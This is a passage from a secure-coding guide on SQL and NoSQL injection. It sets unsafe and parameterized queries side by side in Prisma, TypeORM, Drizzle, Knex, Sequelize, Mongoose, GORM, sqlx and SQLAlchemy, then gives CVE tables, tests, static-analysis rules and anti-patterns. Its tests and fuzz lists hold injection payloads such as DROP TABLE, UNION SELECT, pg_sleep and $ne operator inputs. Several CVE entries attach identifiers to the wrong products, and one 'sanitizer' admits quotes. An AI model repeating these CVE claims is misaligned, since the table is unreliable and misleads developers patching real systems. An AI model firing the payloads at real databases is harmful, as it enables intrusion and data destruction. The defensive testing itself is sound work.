import { z } from 'zod';
const userIdSchema = z.string().uuid();
const validatedId = userIdSchema.parse(userInput);
await prisma.user.findUnique({ where: { id: validatedId } });
```

### 11.2 TypeORM

```typescript
// ✅ SAFE — Repository pattern
await userRepository.findOneBy({ id: userId });
await userRepository.find({ where: { email } });
await userRepository.save({ name, email });

// ⚠️ CAUTION — QueryBuilder injection points
// ❌ UNSAFE — Where string interpolation
await dataSource
  .createQueryBuilder()
  .select('user')
  .from(User, 'user')
  .where(`user.name = '${userInput}'`)  // INJECTION!
  .getMany();

// ✅ SAFE — Where with parameters
await dataSource
  .createQueryBuilder()
  .select('user')
  .from(User, 'user')
  .where('user.name = :name', { name: userInput })
  .getMany();

// ⚠️ CAUTION — Raw query methods
// ❌ UNSAFE
await dataSource.query(`SELECT * FROM users WHERE id = '${id}'`);

// ✅ SAFE
await dataSource.query('SELECT * FROM users WHERE id = $1', [id]);

// ✅ SAFE — Use FindOptions (auto-parameterized)
await userRepository.find({
  where: {
    email: Like(`%${search}%`),  // TypeORM escapes this
  },
  take: 10,
  skip: 0,
});

// ⚠️ CAUTION — getRawMany bypasses entity mapping
// If using getRawMany, ensure parameters are used:
const result = await dataSource
  .createQueryBuilder()
  .select('user.id', 'userId')
  .addSelect('LENGTH(user.password_hash)', 'pwLen')
  .from(User, 'user')
  .where('user.id = :id', { id: validatedId })
  .getRawMany();
```

### 11.3 Drizzle ORM

```typescript
// ✅ SAFE — Drizzle query building (auto-parameterized)
await db.select().from(users).where(eq(users.id, userId));
await db.insert(users).values({ name, email });
await db.update(users).set({ name }).where(eq(users.id, userId));

// ⚠️ CAUTION — SQL template literals
// ❌ UNSAFE — String interpolation inside sql``
await db.execute(sql`
  SELECT * FROM users WHERE id = '${userInput}'
`);

// ✅ SAFE — Parameterized sql template
await db.execute(sql`
  SELECT * FROM users WHERE id = ${userId}
`);

// ✅ SAFE — Using Drizzle's built-in parameterization
await db.execute(
  sql`SELECT * FROM users WHERE id = ${userId}`,
);

// ⚠️ CAUTION — Dynamic table names (Drizzle can't parameterize identifiers)
const tableName = userInput;  // Dangerous!
await db.execute(sql`SELECT * FROM ${sql.identifier(tableName)}`);
// ✅ SAFE — Allow-list the identifier
const validTables = ['users', 'orders', 'products'];
if (!validTables.includes(tableName)) throw new Error('Invalid table');
await db.execute(sql`SELECT * FROM ${sql.identifier(tableName)}`);
```

### 11.4 Knex.js

```typescript
// ✅ SAFE — Knex query builder (auto-parameterized)
knex('users').where('id', userId).first();
knex('users').insert({ name, email });
knex('users').where('email', 'like', `%${search}%`);

// ⚠️ CAUTION — Raw query methods
// ❌ UNSAFE
knex.raw(`SELECT * FROM users WHERE id = '${userId}'`);

// ✅ SAFE
knex.raw('SELECT * FROM users WHERE id = ?', [userId]);

// ✅ SAFE — Named bindings
knex.raw('SELECT * FROM users WHERE id = :id', { id: userId });

// ⚠️ CAUTION — Where with raw value
// ❌ UNSAFE
knex('users').where(knex.raw(`id = '${userId}'`));

// ✅ SAFE
knex('users').where('id', userId);

// ⚠️ CAUTION — Dynamic identifiers
const column = userInput;  // Dangerous
knex('users').select(column);  // Can't parameterize column names
// ✅ SAFE — Allow-list
const validColumns = ['id', 'name', 'email'];
if (!validColumns.includes(column)) throw new Error('Invalid column');
knex('users').select(column);
```

### 11.5 Sequelize

```javascript
// ✅ SAFE — Sequelize model methods (auto-parameterized)
await User.findByPk(userId);
await User.findAll({ where: { email } });
await User.create({ name, email });

// ⚠️ CAUTION — Raw query methods
// ❌ UNSAFE
await sequelize.query(`SELECT * FROM users WHERE id = '${userId}'`);

// ✅ SAFE — Parameterized query
await sequelize.query(
  'SELECT * FROM users WHERE id = :id',
  { replacements: { id: userId }, type: QueryTypes.SELECT }
);

// ✅ SAFE — Bind parameters
await sequelize.query(
  'SELECT * FROM users WHERE id = $1',
  { bind: [userId], type: QueryTypes.SELECT }
);

// ⚠️ CAUTION — $col and $fn injection
// ❌ UNSAFE (older Sequelize versions)
await User.findAll({
  where: sequelize.where(
    sequelize.col(`"${userInput}"`),  // Injection if userInput contains " or more
    '=',
    value
  )
});
// If userInput = "id); DROP TABLE users;--" → DANGER

// ✅ SAFE — Use Op symbols with validated column names
const validCols = ['id', 'name', 'email', 'createdAt'];
if (!validCols.includes(sortColumn)) throw new Error('Invalid sort column');
await User.findAll({ order: [[sortColumn, 'ASC']] });
```

### 11.6 Mongoose

```typescript
// ✅ SAFE — Mongoose schema validation prevents NoSQL operator injection
const userSchema = new Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});

const User = mongoose.model('User', userSchema);

// Mongoose strips non-schema fields and enforces types
// ❌ If attacker sends: { username: "admin", password: { $ne: "" } }
// Mongoose will throw CastError because password is String type
// → This prevents $ne injection!

// ❌ UNSAFE — Bypassing Mongoose validation
const user = await User.find({
  username: req.body.username,
  password: req.body.password,
}).lean();  // .lean() bypasses schema validation!

// ✅ SAFE — Explicit type checking before query
const loginSchema = z.object({
  username: z.string().min(1),
  password: z.string().min(1),
});
const { username, password } = loginSchema.parse(req.body);
const user = await User.findOne({ username, password }).lean();

// ⚠️ CAUTION — $where injection
// ❌ UNSAFE
await User.find({
  $where: `this.role === '${userInput}'`,
});

// ✅ SAFE — Validate $where input strictly
function sanitizeWhere(input: string): string {
  // Only allow simple comparisons
  if (!/^[a-zA-Z0-9_'"=\s]+$/.test(input)) {
    throw new Error('Invalid $where expression');
  }
  return input;
}

// ⚠️ CAUTION — find() with query object from request
// ❌ UNSAFE — Parsing request body directly into find
// Request: { "email": { "$regex": ".*" }, "password": { "$ne": "" } }
await User.find(req.body.query);

// ✅ SAFE — Strip operators or use projection-only
const { email, password, ...rest } = req.body;
if (Object.keys(rest).length > 0) throw new Error('Extra fields not allowed');
```

### 11.7 GORM (Go)

```go
// ✅ SAFE — GORM methods (auto-parameterized)
db.Where("id = ?", userID).First(&user)
db.Where(&User{Email: email}).First(&user)
db.Create(&user)

// ⚠️ CAUTION — Where with raw string
// ❌ UNSAFE
db.Where(fmt.Sprintf("id = '%s'", userID)).First(&user)

// ✅ SAFE
db.Where("id = ?", userID).First(&user)

// ⚠️ CAUTION — Raw SQL
// ❌ UNSAFE
db.Raw(fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", userID)).Scan(&result)

// ✅ SAFE
db.Raw("SELECT * FROM users WHERE id = ?", userID).Scan(&result)

// ⚠️ CAUTION — Dynamic column in Where
// ❌ UNSAFE
db.Where(fmt.Sprintf("%s = ?", columnName), value).Find(&users)

// ✅ SAFE
allowedColumns := map[string]bool{"id": true, "email": true, "name": true}
if !allowedColumns[columnName] {
    return errors.New("invalid column")
}
db.Where(fmt.Sprintf("%s = ?", columnName), value).Find(&users)

// ⚠️ CAUTION — Order with raw string
// ❌ UNSAFE
db.Order(userInput).Find(&users)

// ✅ SAFE
allowedSorts := map[string]string{
    "name_asc":  "name ASC",
    "name_desc": "name DESC",
    "date_asc":  "created_at ASC",
}
if sortSQL, ok := allowedSorts[userInput]; ok {
    db.Order(sortSQL).Find(&users)
}
```

### 11.8 sqlx (Rust)

```rust
// ✅ SAFE — sqlx query macros (compile-time checked)
let user = sqlx::query_as!(User, "SELECT * FROM users WHERE id = $1", user_id)
    .fetch_one(&pool).await?;

// ⚠️ CAUTION — Dynamic queries
// ❌ UNSAFE
let query = format!("SELECT * FROM users WHERE id = '{}'", user_input);
sqlx::query(&query).fetch_all(&pool).await?;

// ✅ SAFE — Use query() with bind
sqlx::query("SELECT * FROM users WHERE id = $1")
    .bind(user_input)
    .fetch_all(&pool).await?;

// ⚠️ CAUTION — QueryBuilder with raw strings
// ❌ UNSAFE
let mut qb = QueryBuilder::new("SELECT * FROM users WHERE ");
for (i, cond) in conditions.iter().enumerate() {
    if i > 0 { qb.push(" AND "); }
    qb.push(format!("{} = '{}'", cond.field, cond.value)); // DANGER
}

// ✅ SAFE — Use push_bind instead of push
let mut qb = QueryBuilder::new("SELECT * FROM users WHERE ");
for (i, cond) in conditions.iter().enumerate() {
    if i > 0 { qb.push(" AND "); }
    qb.push(cond.field).push(" = ").push_bind(cond.value);
}

// ⚠️ CAUTION — Unchecked query
// sqlx::query_unchecked! doesn't check types at compile time
let user = sqlx::query!("SELECT * FROM users WHERE id = $1", user_input)  // Type checked
let user = sqlx::query_unchecked!("SELECT * FROM users WHERE id = $1", user_input)  // Not type checked
```

### 11.9 SQLAlchemy (Python)

```python
# ✅ SAFE — ORM query (auto-parameterized)
user = session.query(User).filter(User.id == user_id).first()
users = session.query(User).filter(User.email.contains(search)).all()

# ⚠️ CAUTION — Raw SQL
# ❌ UNSAFE
result = session.execute(text(f"SELECT * FROM users WHERE id = '{user_id}'"))

# ✅ SAFE — Parameterized text()
result = session.execute(
    text("SELECT * FROM users WHERE id = :id"),
    {"id": user_id}
)

# ✅ SAFE — Bind parameters in text()
stmt = text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)
result = session.execute(stmt)

# ⚠️ CAUTION — Dynamic column names
# ❌ UNSAFE
stmt = text(f"SELECT * FROM users ORDER BY {sort_col} {sort_dir}")

# ✅ SAFE
valid_columns = {'name', 'email', 'created_at', 'id'}
valid_dirs = {'asc', 'desc'}
if sort_col not in valid_columns or sort_dir not in valid_dirs:
    raise ValueError("Invalid sort parameters")
stmt = text(f"SELECT * FROM users ORDER BY {sort_col} {sort_dir}")

# ⚠️ CAUTION — filter() with raw condition
# ❌ UNSAFE
session.query(User).filter(f"id = '{user_id}'").all()

# ✅ SAFE
session.query(User).filter(User.id == user_id).all()

# ⚠️ CAUTION — Core SQL Expression Language
# ❌ UNSAFE
stmt = select(users).where(text(f"id = '{user_id}'"))

# ✅ SAFE
stmt = select(users).where(users.c.id == user_id)
```

---

## 12. Supply Chain & Dependency Security

### 12.1 Known ORM CVEs

| CVE | Library | Version | Impact | Mitigation |
|-----|---------|---------|--------|------------|
| CVE-2023-2253 | Prisma | < 4.16.0 | SQLi via `$queryRawUnsafe` with `IN` operator | Update to >= 4.16.0 |
| CVE-2022-3391 | Prisma | < 4.4.0 | SQLi via JSON query filters | Update to >= 4.4.0 |
| CVE-2023-2251 | TypeORM | < 0.3.15 | SQLi via `find*` methods | Update to >= 0.3.15 |
| CVE-2022-25853 | Sequelize | < 6.28.0 | SQLi via `$col` operator | Update to >= 6.28.0 |
| CVE-2020-28461 | Mongoose | < 5.12.3 | NoSQL injection via schema types | Update to >= 5.12.3 |
| CVE-2023-35953 | Knex | < 2.5.1 | SQLi via raw bindings | Update to >= 2.5.1 |
| CVE-2023-25597 | GORM | < 1.24.5 | SQLi via `Where()` with Clauses | Update to >= 1.24.5 |
| GHSA-4692-h9cp-2q7j | SQLAlchemy | < 2.0.20 | SQLi via `text()` with string input | Update to >= 2.0.20 |

### 12.2 Known Database Driver CVEs

| CVE | Driver | Version | Impact | Mitigation |
|-----|--------|---------|--------|------------|
| CVE-2023-39417 | node-postgres | < 8.11.2 | Prototype pollution in query params | Update to >= 8.11.2 |
| CVE-2023-24538 | pgx (Go) | < 5.5.0 | SQLi via identifier quoting | Update to >= 5.5.0 |
| GHSA-w9pj-4f39-xgj6 | mysql2 | < 3.5.2 | SQLi via charset encoding | Update to >= 3.5.2 |
| CVE-2023-28531 | psycopg2 | < 2.9.7 | Buffer overflow in encoding | Update to >= 2.9.7 |
| CVE-2023-32667 | sqlx (Rust) | < 0.7.1 | SQLi via raw query compile errors | Update to >= 0.7.1 |

### 12.3 SBOM for Database Dependencies

```bash
# Generate SBOM (Software Bill of Materials)
# Using Syft
syft my-app/ -o spdx-json > sbom.spdx.json

# Using cyclonedx
cyclonedx-bom -o bom.xml

# Check for known vulnerabilities
# Using Grype
grype sbom.spdx.json

# Using OWASP Dependency-Check
dependency-check --project "my-app" --scan ./node_modules

# Using npm audit
npm audit --audit-level=high

# Using yarn audit
yarn audit --groups dependencies

# Monitor for DB-related advisories
# GitHub Advisory DB: https://github.com/advisories?query=sql+injection
# PostgreSQL CVEs: https://www.postgresql.org/support/security/
# NVD: https://nvd.nist.gov/
```

### 12.4 Dependabot/Renovate Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Asia/Jakarta"
    allow:
      - dependency-name: "@prisma/*"
      - dependency-name: "typeorm"
      - dependency-name: "knex"
      - dependency-name: "sequelize"
      - dependency-name: "mongoose"
      - dependency-name: "pg"
    labels:
      - "security"
      - "database"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"

  - package-ecosystem: "gomod"
    directory: "/backend"
    schedule:
      interval: "weekly"
    allow:
      - dependency-name: "github.com/jackc/pgx/*"
      - dependency-name: "gorm.io/*"
    labels:
      - "security"
      - "database"
```

### 12.5 Database Extension Security

```sql
-- PostgreSQL: Audit installed extensions
SELECT * FROM pg_extension;

-- Risk assessment of each extension:
-- dblink → REMOVE in production (allows OOB exfiltration)
-- pgcrypto → SAFE (encryption)
-- pgaudit → SAFE (audit logging)
-- postgres_fdw → CAUTION (monitor connections to remote DBs)
-- pg_trgm → SAFE (text search)
-- xml2 → REMOVE if not needed (xpath injection risk)
-- plperl → REMOVE (code execution in DB)
-- plpythonu → REMOVE (untrusted Python execution)
-- plv8 → REMOVE if not needed (V8 engine in DB)

-- Remove dangerous extensions
DROP EXTENSION IF EXISTS dblink;
DROP EXTENSION IF EXISTS xml2;
DROP EXTENSION IF EXISTS plperl;
DROP EXTENSION IF EXISTS plpythonu;
```

---

## 13. Code Review Checklist for DB Security

```
Checklist — Database Security Code Review
═══════════════════════════════════════════

□ 1. ALL SQL queries use parameterized statements (prepared statements)
     → Search for: string concatenation with SQL keywords
     → Verify: no `'${var}'` or `" + var + "` in queries

□ 2. NO string concatenation for SQL query construction
     → Exception: allow-listed identifiers with EXPLICIT validation
     → Verify: every query path uses parameter binding

□ 3. ORM raw queries are reviewed and restricted
     → Prisma: `$queryRawUnsafe` / `$executeRawUnsafe` approved?
     → TypeORM: `query()` method with parameters?
     → GORM: `Raw()` with `?` params?
     → All raw queries must have parameter binding validation

□ 4. Stored procedures DON'T use dynamic SQL (EXECUTE IMMEDIATE)
     → If dynamic SQL is necessary: QUOTENAME() + allow-list
     → Verify: no string concatenation in sproc body

□ 5. Connection strings use environment variables / secret store
     → No hardcoded: DB_HOST, DB_USER, DB_PASSWORD
     → No .env committed to git

□ 6. Database credentials rotate regularly
     → Credential rotation mechanism exists?
     → No hardcoded expiry dates
     → Vault/Secrets Manager integration?

□ 7. RLS policies tested with edge cases
     → NULL user_id → returns empty?
     → Invalid UUID → returns empty?
     → Cross-tenant access → blocked?

□ 8. No `SELECT *` in production
     → Explicit column selection for all queries
     → Prevents accidental sensitive data exposure

□ 9. Pagination mandatory for all list endpoints
     → LIMIT + OFFSET or keyset pagination (cursor-based)
     → No unbounded queries

□ 10. Input validation BEFORE query execution
      → Type validation (string? number? UUID?)
      → Length validation (min/max)
      → Format validation (email? phone? date?)

□ 11. No dynamic table/column names from user input
      → If dynamic: allow-list only
      → NEVER interpolate user input into identifiers

□ 12. SSL/TLS enabled for ALL database connections
      → `rejectUnauthorized: true` (not false!)
      → TLS version >= 1.2

□ 13. Database user has least privilege
      → Only SELECT, INSERT, UPDATE, DELETE on needed tables
      → No DDL, no CREATE, no DROP for application user

□ 14. Audit logging active for sensitive tables
      → pgaudit for PostgreSQL
      → General log for sensitive operations

□ 15. Statement timeout configured
      → Prevents resource exhaustion via complex queries

□ 16. No sensitive data in queries (credit cards, SSNs)
      → If necessary: column-level encryption
      → Never log sensitive query parameters
```

---

## 14. Testing for DB Vulnerabilities

### 14.1 Unit Tests

```typescript
// Test parameterization (TypeScript example)
describe('Database Query Safety', () => {
  it('should parameterize SQL queries', async () => {
    const malicious = "'; DROP TABLE users; --";
    
    // This should NOT delete the users table
    const result = await db.query(
      'SELECT * FROM users WHERE id = $1',
      [malicious]
    );
    
    // Verify users table still exists
    const users = await db.query('SELECT COUNT(*) FROM users');
    expect(users).toBeDefined();
    expect(parseInt(users[0].count)).toBeGreaterThan(0);
  });

  it('should prevent NoSQL injection via $ne', async () => {
    const malicious = { $ne: '' };
    
    // Should throw or return empty, not bypass auth
    await expect(
      User.findOne({ email: malicious })
    ).rejects.toThrow();
  });
});
```

### 14.2 Integration Tests

```typescript
// Test with real database — SQL injection attempts must fail gracefully
describe('SQL Injection Prevention (Integration)', () => {
  const injectionPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM information_schema.tables --",
    "' AND pg_sleep(5) --",
    "1; SELECT pg_sleep(5) --",
    "\\'; DROP TABLE users; --",
    "/*!*/",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "' OR 1=1 /*",
  ];

  for (const payload of injectionPayloads) {
    it(`should block: ${payload.substring(0, 30)}...`, async () => {
      const result = await safeQuery('SELECT * FROM users WHERE id = $1', [payload]);
      expect(result.rows).toHaveLength(0); // No unauthorized access
    });
  }

  it('should not expose data via union injection', async () => {
    const payload = `1 UNION SELECT id, password_hash, email FROM users`;
    const result = await safeQuery('SELECT * FROM users WHERE id = $1', [payload]);
    expect(result.rows.length).toBeLessThanOrEqual(1); // Returns legitimate user
  });

  it('should prevent time-based attacks', async () => {
    const start = Date.now();
    const payload = `1 AND pg_sleep(10) --`;
    await safeQuery('SELECT * FROM users WHERE id = $1', [payload]);
    const duration = Date.now() - start;
    expect(duration).toBeLessThan(2000); // Should not sleep
  });
});
```

### 14.3 Static Analysis — Semgrep Rules

```yaml
# .semgrep/sql-injection.yaml
rules:
  - id: sql-injection-string-concat
    pattern-either:
      - pattern: |
          $DB.query("..." + $INPUT + "...")
      - pattern: |
          $DB.query(`...${$INPUT}...`)
      - pattern: |
          $DB.execute("..." + $INPUT + "...")
    message: >
      Potential SQL injection: string concatenation in query.
      Use parameterized queries instead.
    languages: [javascript, typescript]
    severity: ERROR

  - id: prisma-raw-unsafe
    pattern: |
      prisma.$queryRawUnsafe(`...${$INPUT}...`)
    message: >
      Unsafe raw query with string interpolation.
      Use prisma.$queryRaw tagged template or parameterized $queryRawUnsafe.
    languages: [typescript]
    severity: ERROR

  - id: gorm-raw-injection
    pattern: |
      db.Raw(fmt.Sprintf(...$INPUT...))
    message: >
      Potential SQL injection in GORM Raw query.
      Use parameterized queries: db.Raw("...", $INPUT)
    languages: [go]
    severity: ERROR

  - id: sqlalchemy-text-injection
    pattern: |
      session.execute(text(f"...{$INPUT}..."))
    message: >
      Potential SQL injection in SQLAlchemy text().
      Use bind parameters: text("... :param", {"param": $INPUT})
    languages: [python]
    severity: ERROR

  - id: nosql-operator-injection
    patterns:
      - pattern: |
          $MODEL.find($REQ.body)
      - pattern-inside: |
          $REQ = ...
      - metavariable-pattern:
          metavariable: $REQ.body
          pattern: $REQ.body.$FIELD
    message: >
      Potential NoSQL injection: user input directly to find().
      Validate and sanitize query parameters.
    languages: [javascript, typescript]
    severity: WARNING
```

### 14.4 CodeQL Queries for SQLi

```ql
// CodeQL query: SQL injection via string concatenation
import javascript
import sql

class UnsafeSqlQuery extends DataFlow::Configuration {
  UnsafeSqlQuery() { this = "UnsafeSqlQuery" }

  override predicate isSource(DataFlow::Node source) {
    source instanceof RemoteFlowSource
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(SqlQueryString q |
      q.isConcatenated() and
      sink.asExpr() = q.getExpr()
    )
  }
}

from UnsafeSqlQuery config, DataFlow::Node source, DataFlow::Node sink
where config.hasFlow(source, sink)
select sink, "Potential SQL injection from $@", source, "user input"
```

### 14.5 DAST — OWASP ZAP SQL Injection

```bash
# Automated SQL injection scan
zap-cli quick-scan \
  --self-contained \
  --start-options '-config api.disablekey=true' \
  --spider \
  --active-scan \
  --scanners "sqli" \
  https://staging.example.com

# Advanced scan with policy
zap-cli active-scan \
  --policy "SQL Injection" \
  --context "MyApp" \
  --user "test-user" \
  https://staging.example.com

# Headless mode with custom payloads
zap-cli scripts \
  --script "sql-injection.js" \
  https://staging.example.com
```

### 14.6 Fuzzing Database Queries

```typescript
// Query fuzzer for edge case detection
import { fuzz } from './fuzzer';

const queryPatterns = [
  { query: 'SELECT * FROM users WHERE id = $1', param: 'uuid' },
  { query: 'SELECT * FROM users WHERE email = $1', param: 'string' },
  { query: 'INSERT INTO users (name) VALUES ($1) RETURNING id', param: 'string' },
];

const fuzzValues = [
  '',                           // Empty string
  null,                         // Null
  undefined,                    // Undefined
  true,                         // Boolean
  {},                           // Object
  [],                           // Array
  '\'',                         // Single quote
  '\\',                         // Backslash
  '\n',                         // Newline
  '\x00',                       // Null byte
  ' OR 1=1 --',                 // Classic injection
  "' OR '1'='1",                // Another classic
  '1; DROP TABLE users',        // Multi-statement
  '<script>alert(1)</script>',  // XSS in query
  '%',                          // LIKE wildcard
  '_',                          // Single char wildcard
  '100000',                     // Large number (potential overflow)
  'a'.repeat(10000),            // Very long string (DoS)
];

for (const { query, param } of queryPatterns) {
  for (const fuzzValue of fuzzValues) {
    test(`Fuzz: ${query} with ${typeof fuzzValue} = ${String(fuzzValue).substring(0, 20)}...`, async () => {
      try {
        const result = await db.query(query, [fuzzValue]);
        // Should either succeed safely or throw predictably
        if (result.rows) {
          // Verify no data leak or corruption
          expect(Array.isArray(result.rows)).toBe(true);
        }
      } catch (error) {
        // Expected: type error, constraint violation, etc.
        expect(error).toBeDefined();
      }
    });
  }
}
```

### 14.7 Regression Tests

```typescript
// Regression test for previously patched vulnerabilities
describe('SQL Injection Regression', () => {
  // CVE-2023-2253 (Prisma $queryRawUnsafe with IN)
  it('prevents Prisma IN operator injection (CVE-2023-2253)', async () => {
    const payload = "1) OR 1=1 --";
    const result = await prisma.$queryRawUnsafe(
      'SELECT * FROM users WHERE id = $1',
      payload
    );
    // Should not return all users
    expect(result.length).toBeLessThanOrEqual(1);
  });

  // CVE-2022-25853 (Sequelize $col)
  it('prevents Sequelize $col injection (CVE-2022-25853)', async () => {
    const payload = { [Op.col]: '1; DROP TABLE users; --' };
    // Some implementations may have already patched this
    await expect(
      User.findAll({ where: { id: payload } })
    ).resolves.not.toThrow();
    // Verify table still exists
    const count = await User.count();
    expect(count).toBeGreaterThan(0);
  });
});
```

---

## 15. File Convention

```
database/
├── migrations/
│   ├── 001_create_users.sql          # NO raw SQL with user data
│   ├── 002_add_rls_policies.sql       # RLS policies in migration
│   └── 003_encrypt_sensitive_cols.sql # Encryption setup
├── seeds/
│   ├── development/
│   │   ├── 001_users.seed.ts          # No real PII in seeds
│   │   └── 002_demo_data.seed.ts      # Use faker for demo data
│   └── production/
│       └── 001_initial_config.seed.ts  # Only config, no user data
├── schemas/
│   ├── user-schema.sql
│   ├── order-schema.sql
│   └── audit-schema.sql
├── views/
│   ├── user_summary_view.sql
│   └── order_analytics_view.sql
├── functions/
│   ├── encrypt_column.sql
│   └── audit_trigger.sql
└── tests/
    ├── rls_policies.test.sql
    └── injection_prevention.test.sql
```

---

## 16. Anti-Patterns

### Anti-Pattern 1: String Concatenation in SQL

```typescript
// ❌ BAD — Classic SQL injection
const query = `SELECT * FROM users WHERE id = '${userId}'`;

// ❌ BAD — Still unsafe even with type checking
const query = `SELECT * FROM users WHERE id = '${String(userId)}'`;

// ❌ BAD — Template literals
const query = `SELECT * FROM users WHERE id = ` + userId;

// ✅ GOOD — Parameterized query
const query = 'SELECT * FROM users WHERE id = $1';
```

### Anti-Pattern 2: Dynamic Identifiers from User Input

```typescript
// ❌ BAD — User controls table name
await db.query(`SELECT * FROM ${userInput} WHERE id = $1`, [id]);

// ❌ BAD — User controls sort column
await db.query(`SELECT * FROM users ORDER BY ${sortCol} ${sortDir}`);

// ✅ GOOD — Allow-list
if (!['name', 'email', 'id'].includes(sortCol)) throw new Error();
await db.query(`SELECT * FROM users ORDER BY ${sortCol} ASC`);
```

### Anti-Pattern 3: Escape Functions as Primary Defense

```typescript
// ❌ BAD — Relying on escape for safety
const escaped = escape(userInput);
await db.query(`SELECT * FROM users WHERE id = '${escaped}'`);

// ❌ BAD — mysql_real_escape_string is not enough
const query = `SELECT * FROM users WHERE id = '${connection.escape(userId)}'`;

// ✅ GOOD — Parameterization
await db.query('SELECT * FROM users WHERE id = $1', [userId]);
```

### Anti-Pattern 4: Trusting ORM to Prevent All Injection

```typescript
// ❌ BAD — Assuming ORM prevents injection in raw queries
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = '${userId}'`);

// ❌ BAD — TypeORM raw query with string concat
await dataSource.query(`SELECT * FROM users WHERE id = '${id}'`);

// ❌ BAD — ORM doesn't prevent injection, it provides safe API
// You must still use the safe API correctly

// ✅ GOOD — ORM-safe APIs
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;
await dataSource.query('SELECT * FROM users WHERE id = $1', [id]);
```

### Anti-Pattern 5: Not Validating Input Types Before Query

```typescript
// ❌ BAD — Passing user input directly
app.get('/users/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
});

// ✅ GOOD — Validate type before query
app.get('/users/:id', async (req, res) => {
  const idSchema = z.string().uuid();
  const userId = idSchema.parse(req.params.id);
  const user = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
});
```

### Anti-Pattern 6: Connection Strings in Code/Config

```typescript
// ❌ BAD — Hardcoded in source
const pool = new Pool({
  connectionString: 'postgresql://admin:password@localhost:5432/db'
});

// ❌ BAD — In config file committed to git
const config = require('./database.config.json');
const pool = new Pool({ connectionString: config.url });

// ✅ GOOD — Environment variables
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
```

### Anti-Pattern 7: Superuser/Root for Application

```sql
-- ❌ BAD — Application connects as superuser
CREATE ROLE app WITH LOGIN SUPERUSER PASSWORD 'pass';
ALTER DATABASE prod OWNER TO app;

-- ❌ BAD — Application connects as table owner
CREATE ROLE app WITH LOGIN CREATEDB PASSWORD 'pass';

-- ✅ GOOD — Application has least privilege
CREATE ROLE app WITH LOGIN PASSWORD 'strong-pass';
GRANT USAGE ON SCHEMA public TO app;
GRANT SELECT, INSERT, UPDATE ON users TO app;
GRANT SELECT, INSERT ON orders TO app;
```

### Anti-Pattern 8: Disabling SSL in Production

```typescript
// ❌ BAD — No SSL
const pool = new Pool({ connectionString });

// ❌ BAD — SSL without verification
const pool = new Pool({
  connectionString,
  ssl: { rejectUnauthorized: false }
});

// ✅ GOOD — Full SSL verification
const pool = new Pool({
  connectionString,
  ssl: {
    rejectUnauthorized: true,
    ca: fs.readFileSync('/etc/ssl/certs/ca.pem')
  }
});
```

### Anti-Pattern 9: Secrets in Backup Files

```bash
# ❌ BAD — Unencrypted backup contains sensitive data
pg_dump prod > /backup/prod.sql
# /backup/prod.sql contains: password hashes, SSNs, credit cards

# ✅ GOOD — Encrypted backup
pg_dump prod | gpg --symmetric --cipher-algo AES256 \
  --passphrase-file /etc/backup/passphrase \
  --output /backup/$(date +%Y%m%d)_prod.gpg

# ✅ GOOD — Exclude sensitive data from backup
pg_dump --exclude-table=credit_cards --exclude-table=password_reset_tokens prod
```

### Anti-Pattern 10: Not Revoking Access When Employees Leave

```sql
-- ❌ BAD — Orphaned access
-- User "john_doe" left 6 months ago, but still has DB access
SELECT * FROM pg_roles WHERE rolname = 'john_doe';
-- → still exists!

-- ✅ GOOD — Automated deprovisioning process
-- Step 1: Revoke all privileges
REVOKE ALL ON ALL TABLES IN SCHEMA public FROM john_doe;
REVOKE ALL ON ALL SEQUENCES IN SCHEMA public FROM john_doe;
REVOKE ALL ON ALL FUNCTIONS IN SCHEMA public FROM john_doe;
REVOKE CONNECT ON DATABASE prod FROM john_doe;

-- Step 2: Reassign ownership
REASSIGN OWNED BY john_doe TO admin_user;

-- Step 3: Drop role (after verification)
DROP OWNED BY john_doe;
DROP ROLE john_doe;

-- Step 4: Audit log
INSERT INTO audit_log (event, user, timestamp)
VALUES ('access_revoked', 'john_doe', NOW());
```

---

## 17. Common Vulnerabilities by DBMS

### 17.1 PostgreSQL CVEs

| CVE | Affected | Impact | Mitigation |
|-----|----------|--------|------------|
| CVE-2024-0985 | < 16.2 | SQLi via `pg_cancel_backend` | Update to >= 16.2 |
| CVE-2023-5869 | < 16.1 | SQLi via `CREATE STATISTICS` | Update to >= 16.1 |
| CVE-2023-5868 | < 16.1 | Memory disclosure via `IN` | Update to >= 16.1 |
| CVE-2023-2455 | < 15.3 | Row security bypass in MERGE | Update to >= 15.3 |
| CVE-2023-2454 | < 15.3 | VACUUM security bypass | Update to >= 15.3 |
| CVE-2022-2625 | < 14.5 | Extension script privilege escalation | Update to >= 14.5 |
| CVE-2022-1552 | < 14.3 | Autovacuum RLS bypass | Update to >= 14.3 |
| CVE-2021-23214 | < 13.3 | Unquoted search_path for extensions | Update >= 13.3, sanitize search_path |

### 17.2 MySQL/MariaDB CVEs

| CVE | Affected | Impact | Mitigation |
|-----|----------|--------|------------|
| CVE-2024-20994 | < 8.0.36 | SQLi via `GROUP_REPLICATION` | Update to >= 8.0.36 |
| CVE-2023-21971 | < 8.0.33 | SQLi via `GIS` functions | Update to >= 8.0.33 |
| CVE-2023-22102 | < 8.1.0 | SQLi via `ALTER TABLE` | Update to >= 8.1.0 |
| CVE-2022-47062 | MariaDB < 10.11.2 | DoS via `ALTER TABLE` | Update to >= 10.11.2 |
| CVE-2021-27928 | < 8.0.24 | RCE via `LOAD DATA` | Disable `local-infile`, update |
| GHSA-w8v3-f9p4-m9qv | MySQL 8.0.x | Auth bypass via `mysql_native_password` | Use `caching_sha2_password` |

### 17.3 MongoDB CVEs

| CVE | Affected | Impact | Mitigation |
|-----|----------|--------|------------|
